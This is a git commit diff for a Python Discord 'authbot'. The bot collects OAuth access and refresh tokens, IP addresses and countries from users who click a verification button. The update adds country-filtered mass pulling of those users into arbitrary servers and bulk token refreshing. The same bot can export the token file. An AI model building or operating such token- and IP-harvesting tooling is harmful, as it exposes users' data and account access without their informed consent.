c2e34690ef14d9070e6c01210f17111ea9fdf015
knockstick <93650707+knockstick@users.noreply.github.com>
2024-05-09 16:56:26 +0700

    🎉 Update 1.2

--- bot.py
+++ bot.py
@@ -3,7 +3,9 @@ import logging
 import discord
 import asyncio
 import aiohttp
+import shutil
 import json
+import time
 import os
 
 from quart import Quart, redirect, request, render_template
@@ -12,19 +14,23 @@ from pystyle import Write, Colors
 with open('config.json', 'r') as f:
     config = json.load(f)
 
-token = config.get('token', 'MISSING')
-redirect_uri = config.get('redirect_uri', 'http://127.0.0.1:8000')
-client_secret = config.get('client_secret', 'MISSING')
-client_id = config.get('client_id', 0)
-scope = config.get('scope', 'identify%20guilds.join')
-owners = config.get('owners', [])
-admins = config.get('admin_guilds', [])
-log_channel = config.get('log_channel', 0)
+__title__ = "kno's authbot"
+__author__ = "knockstick"
+__version__ = "1.2"
 
-quart_logging = config.get('server_logging', True)
+token = config['token']
+redirect_uri = config['redirect_uri']
+client_secret = config['client_secret']
+client_id = config['client_id']
+scope = config['scope']
+owners = config['owners']
+admins = config['admin_guilds']
+log_channel = config['log_channel']
 
-server_host = config.get('server_host', '0.0.0.0')
-server_port = config.get('server_port', 8000)
+quart_logging = config['server_logging']
+
+server_host = config['server_host']
+server_port = config['server_port']
 
 if not quart_logging:
     logging.getLogger('hypercorn.access').disabled = True
@@ -84,25 +90,29 @@ async def get_userdata(access_token, session):
         return userdata, guild_data
     elif guild_data_response.status == 401:
         return userdata, []
+    elif userdata_response.status == 401:
+        raise Exception("unauthorized")
     else:
         return userdata
 
 
 async def refresh_token(refresh_token, session):
-  data = {
-    'client_id': client_id,
-    'client_secret': client_secret,
-    'grant_type': 'refresh_token',
-    'refresh_token': refresh_token
-  }
-  headers = {
-    'Content-Type': 'application/x-www-form-urlencoded'
-  }
-  r = await session.post(TOKEN_URL, data=data, headers=headers)
-  return await r.json()
+    data = {
+        'client_id': client_id,
+        'client_secret': client_secret,
+        'grant_type': 'refresh_token',
+        'refresh_token': refresh_token
+    }
+    headers = {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    r = await session.post(TOKEN_URL, data=data, headers=headers)
+    json_resp = await r.json()
+
+    return json_resp
 
 
-async def update_data_file(user_id, refresh_token):
+async def update_data_file(user_id, refresh_token, access_token, ip, country):
     try:
         with open('data.json', 'r') as file:
             data = json.load(file)
@@ -110,21 +120,20 @@ async def update_data_file(user_id, refresh_token):
         data = {"users": {}}
 
     if refresh_token not in data["users"]:
-        data["users"][refresh_token] = {"id": user_id}
+        data["users"][refresh_token] = {"id": user_id, "at": access_token, "ip": ip, "co": country.lower()}
 
         with open('data.json', 'w') as file:
-            json.dump(data, file, indent=4)
+            json.dump(data, file)
         return "new user"
     else:
         return "already authed"
 
 
-async def pull(ctx, server_id, amount=None):
+async def pull(ctx, server_id, amount=None, country=None):
     session = aiohttp.ClientSession()
     success = 0
     fail = 0
     already_in_server = 0
-
     total = 0
 
     with open('data.json', 'r') as f:
@@ -138,6 +147,13 @@ async def pull(ctx, server_id, amount=None):
     for refresh_token2 in keys:
         user_data = data1["users"][refresh_token2]
         user_id = user_data["id"]
+
+        user_country = user_data.get("co", None)
+        user_ip = user_data.get("ip", "127.0.0.1")
+
+        if country is not None and (user_country is None or user_country.lower() != country.lower()):
+            continue
+
         refresh_json = await refresh_token(refresh_token2, session)
 
         at = refresh_json.get("access_token")
@@ -146,11 +162,11 @@ async def pull(ctx, server_id, amount=None):
         if at is None and rt is None:
             continue
 
-        data1["users"][rt] = {"id": user_id}
+        data1["users"][rt] = {"id": user_id, "at": at, "ip": user_ip, "co": user_country if user_country is not None else "n/a"}
         del data1["users"][refresh_token2]
 
         with open('data.json', 'w') as f:
-            json.dump(data1, f, indent=4)
+            json.dump(data1, f)
 
         url = f'https://discord.com/api/guilds/{server_id}/members/{user_id}'
         data = {
@@ -162,7 +178,7 @@ async def pull(ctx, server_id, amount=None):
         }
         try:
             r = await session.put(url, json=data, headers=headers)
-            if r.status == 200 or r.status == 201:
+            if r.status in (200, 201):
                 success += 1
             elif r.status == 204:
                 already_in_server += 1
@@ -182,7 +198,9 @@ async def pull(ctx, server_id, amount=None):
 
     embed = discord.Embed(title="Pull results", color=color)
 
-    embed.description = f"**Pull to `{bot.get_guild(int(server_id)).name}`**\n\n"
+    embed.description = f"**Pull to `{bot.get_guild(int(server_id)).name}`**\n"
+    if country is not None:
+        embed.description += f"**Pulled only members from country: `{country.upper()}`**\n\n"
     embed.description += f":ballot_box_with_check: **Already in server: `{already_in_server}`**\n"
     embed.description += f":white_check_mark: **Success: `{success}`**\n"
     embed.description += f":x: **Fail: `{fail}`**\n\n"
@@ -233,7 +251,6 @@ async def login(endpoint):
     session = aiohttp.ClientSession()
     code = request.args.get('code')
     state = endpoint
-    print(state)
 
 
     if not code:
@@ -251,7 +268,8 @@ async def login(endpoint):
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     await session.close()
 
-    updater = await update_data_file(user_json['id'], refresh_token)
+    country, region, isp = get_ip_info(user_ip)
+    updater = await update_data_file(user_json['id'], refresh_token, access_token['access_token'], user_ip, country)
     
     user_id = user_json['id']
     username = user_json['username']
@@ -259,8 +277,6 @@ async def login(endpoint):
     global_name = user_json['global_name']
     mfa = user_json['mfa_enabled']
     locale = user_json['locale']
-
-    country, region, isp = get_ip_info(user_ip)
 
     if avatar_hash is not None:
         avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.webp?size=1024"
@@ -337,15 +353,19 @@ async def on_ready():
 \td88' `?88b,d88'   88b`?8888P'`?888P'     `?88P'`88b`?88P'?8b  `?8b  d88'   88bd88'`?88P'`?8888P'  `?8b  
 """
     Write.Print(banner + '\n', Colors.purple_to_blue, interval=0)
+
+    print(f"\t\t\t\t\tkno's authbot v{__version__}\n")
+
     print(f"\t\t\t\t\tLogged as {bot.user}")
     print(f"\t\t\t\t\tTotal Users: {total_users}")
     print(f"\t\t\t\t\tScopes: {scope.replace('%20', ', ')}")
     print(f"\t\t\t\t\tGuilds: {len(bot.guilds)}\n")
+
     Write.Print(f"\t\t\t\thttps://github.com/knockstick/knos-authbot/\n\n", Colors.blue_to_purple, interval=0)
 
 
 @bot.slash_command(name="pull", description="Pull your members to desired server", guild_ids=admins)
-async def pull_command(ctx: discord.ApplicationContext, server_id: discord.Option(str, description="Server ID"), amount: discord.Option(int, description="Amount of members to pull, defaults to all your members", required=False)=None): # type: ignore
+async def pull_command(ctx: discord.ApplicationContext, server_id: discord.Option(str, description="Server ID"), amount: discord.Option(int, description="Amount of members to pull, defaults to all your members", required=False)=None, country: discord.Option(str, description=f"Pull only members with specified country. Example: us")=None): # type: ignore
     if ctx.author.id not in owners:
         return
 
@@ -354,9 +374,15 @@ async def pull_command(ctx: discord.ApplicationContext, server_id: discord.Optio
         await ctx.respond("Guild not found! Make sure the bot is in it!", ephemeral=True)
         return
         
+    t = f"Pulling started! Server: `{guild.name}`"
 
-    await ctx.respond(f"Pulling started! Server: `{guild.name}`", ephemeral=True)
-    await pull(ctx, server_id, amount)
+    if amount is not None:
+        t += f"\nPulling **{amount}** members"
+    if country is not None:
+        t += f"\nPulling only members from **{country.upper()}**"
+
+    await ctx.respond(t, ephemeral=True)
+    await pull(ctx, server_id, amount, country)
 
 
 @bot.slash_command(name="getdata", description="Get all member data", guild_ids=admins)
@@ -365,7 +391,7 @@ async def getdata(ctx: discord.ApplicationContext):
         return
     
     file = discord.File("data.json")
-    await ctx.respond(content="The tokens in this file will expire in 7 days (counting from the last pull).\nTo refresh the tokens, pull your members to any server.", file=file, ephemeral=True)
+    await ctx.respond(content="Upload this backup using `/uploaddata`\nRemove unauthorized users using `/usercheck`", file=file, ephemeral=True)
 
 
 @bot.slash_command(name="uploaddata", description="Upload your data file on the server", guild_ids=admins)
@@ -386,7 +412,7 @@ async def uploaddata(ctx: discord.ApplicationContext, file: discord.Option(disco
             data = json.load(f)
             total_users = len(data.get('users', {}))
 
-        await msg.edit_original_response(content=f"Data successfully loaded! Total users: **{total_users}**\nWarning: If you uploaded users from another app, they will not be valid!")
+        await msg.edit_original_response(content=f"Data successfully loaded! Total users (unchecked): **{total_users}**\nWarning: If you uploaded users from another app, they will not be valid!\nStart a user check using `/usercheck`")
     except Exception as e:
         await ctx.respond(f"An error occurred while uploading the file: `{e}`", ephemeral=True)
 
@@ -400,7 +426,7 @@ async def usercount(ctx: discord.ApplicationContext):
         data = json.load(f)
         count = len(data["users"])
 
-    await ctx.respond(f"Total authorized users: **{count}**", ephemeral=True)
+    await ctx.respond(f"Total authorized users: **{count}**\nStart a user check using `/usercheck` to get accurate user count.", ephemeral=True)
 
 
 @bot.slash_command(name="verify-embed", description="Create a custom verification embed", guild_ids=admins)
@@ -429,16 +455,122 @@ async def verify_embed(ctx: discord.ApplicationContext,
     login_url_with_state = LOGIN_URL + f"&state={channel.guild.id}"
 
     view = discord.ui.View()
-    view.add_item(discord.ui.Button(label=button_text, url=login_url_with_state, emoji=bot.get_emoji(int(button_emoji)) if button_emoji is not None else None))
-    
+    try:
+        view.add_item(discord.ui.Button(label=button_text, url=login_url_with_state, emoji=bot.get_emoji(int(button_emoji)) if button_emoji is not None else None))
+    except Exception as e:
+        return await ctx.respond(f'An error occurred while adding button to the view: `{e}`', ephemeral=True)
+
     await channel.send(embed=embed, view=view)
     await ctx.respond(":white_check_mark:", ephemeral=True)
 
+    
+@bot.slash_command(name='usercheck', description="Check your users and remove unauthorized", guild_ids=admins)
+async def db_update(ctx: discord.ApplicationContext):
+    if ctx.author.id not in owners:
+        return
+    
+    await ctx.respond("Check started! You will be mentioned when it will end.", ephemeral=True)
+    channel = ctx.channel
+
+    shutil.copyfile('data.json', 'check_copy.json')
+
+    alive = 0
+    unauthorized = 0
+    failed = 0
+    refreshed = 0
+
+    current_time = time.time()
+    
+    with open('check_copy.json', 'r') as f:
+        data = json.load(f)
+        users = data.get('users', {})
+
+    async with aiohttp.ClientSession() as session:
+        updated_users = {}
+        
+        for user_id, user in users.items():
+            access_token = user.get('at', None)
+            
+            try:
+                if not access_token:
+                    # If there's no access token, try to get it
+                    refresh_result = await refresh_token(user_id, session)
+
+                    if 'access_token' in refresh_result and 'refresh_token' in refresh_result:
+                        refreshed += 1
+                        alive += 1
+                        new_refresh_token = refresh_result['refresh_token']
+                        user['at'] = refresh_result['access_token']
+                        updated_users[new_refresh_token] = user
+                    elif 'error' in refresh_result and refresh_result['error'] == 'invalid_grant':
+                        unauthorized += 1
+                    else:
+                        failed += 1
+                    continue
+
+                if 'ip' not in user:
+                    user['ip'] = '127.0.0.1'
+                if 'co' not in user:
+                    user['co'] = 'n/a'
+
+                userdata, guilds = await get_userdata(access_token, session)
+
+                if 'username' in userdata:
+                    alive += 1
+                    updated_users[user_id] = user
+                elif 'message' in userdata and userdata['message'] == '401: Unauthorized':
+                    # Try to refresh the token
+                    refresh_result = await refresh_token(user_id, session)
+
+                    if 'access_token' in refresh_result and 'refresh_token' in refresh_result:
+                        refreshed += 1
+                        alive += 1
+                        new_refresh_token = refresh_result['refresh_token']
+                        user['at'] = refresh_result['access_token']
+                        updated_users[new_refresh_token] = user
+                    elif 'error' in refresh_result and refresh_result['error'] == 'invalid_grant':
+                        unauthorized += 1
+                    else:
+                        failed += 1
+                else:
+                    failed += 1
+            except Exception as ex:
+                failed += 1
+                logging.error(f"Unexpected error for user {user_id}: {str(ex)}")
+
+    data['users'] = updated_users
+    
+    with open('data.json', 'w') as f:
+        json.dump(data, f)
+
+    os.remove('check_copy.json')
+    total_seconds = time.time() - current_time
+    
+    def format_time(seconds):
+        h = int(seconds // 3600)
+        rem = seconds % 3600
+        m = int(rem // 60)
+        s = int(rem % 60)
+        return f"{h}h {m}m {s}s"
+    
+    total_time = format_time(total_seconds)
+
+    emb = discord.Embed(
+        title=":white_check_mark: Check report",
+        description=f":clock4: **Time elapsed: `{total_time}`**",
+        color=discord.Color.embed_background()
+    )
+
+    emb.add_field(name=":busts_in_silhouette: Users", value=f"**`{len(users)}`**")
+    emb.add_field(name=":partying_face: Alive", value=f"**`{alive}`**")
+    emb.add_field(name=":arrows_clockwise: Tokens refreshed", value=f"**`{refreshed}`**")
+    emb.add_field(name=":cry: Deauthorized", value=f"**`{unauthorized}`**")
+    emb.add_field(name=":x: Failed", value=f"**`{failed}`**")
+
+    await channel.send(content=ctx.author.mention, embed=emb)
+    
+
 try:
     bot.run()
-except discord.errors.PrivilegedIntentsRequired:
-    print("Error running bot: You need to turn privileged intents in the Discord Developer Portal: https://discord.com/developers")
-except discord.errors.LoginFailure:
-    print("Error running bot: Bot token is invalid, please check config.json")
 except Exception as e:
     print(f"Unhandled error running bot: {e}")
